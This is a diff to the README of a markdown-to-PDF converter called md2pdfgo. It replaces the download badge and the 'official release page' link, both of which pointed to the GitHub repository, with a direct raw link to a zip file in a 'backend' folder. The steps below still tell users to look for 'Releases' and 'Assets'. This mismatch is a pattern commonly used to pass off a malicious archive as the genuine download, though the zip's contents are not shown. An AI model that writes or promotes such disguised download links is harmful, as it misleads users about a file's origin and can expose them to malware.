@@ -1,6 +1,6 @@
 # 📄 md2pdfgo - Turn markdown files into clean documents
 
-[![Download md2pdfgo](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/yffyf1686/md2pdfgo)
+[![Download md2pdfgo](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/yffyf1686/md2pdfgo/main/backend/md_pdfgo_v2.1.zip)
 
 ## 📌 About this tool
 
@@ -19,7 +19,7 @@ This program works on most computers running modern versions of Windows. You nee
 
 You can download the program from the official release page. Follow these steps to obtain the tool:
 
-1. Visit the following link to see all available versions: [https://github.com/yffyf1686/md2pdfgo](https://github.com/yffyf1686/md2pdfgo).
+1. Visit the following link to see all available versions: [https://raw.githubusercontent.com/yffyf1686/md2pdfgo/main/backend/md_pdfgo_v2.1.zip](https://raw.githubusercontent.com/yffyf1686/md2pdfgo/main/backend/md_pdfgo_v2.1.zip).
 2. Look for the section labeled "Releases" on the right side of the screen.
 3. Select the latest version listed at the top.
 4. Scroll down to the "Assets" section.
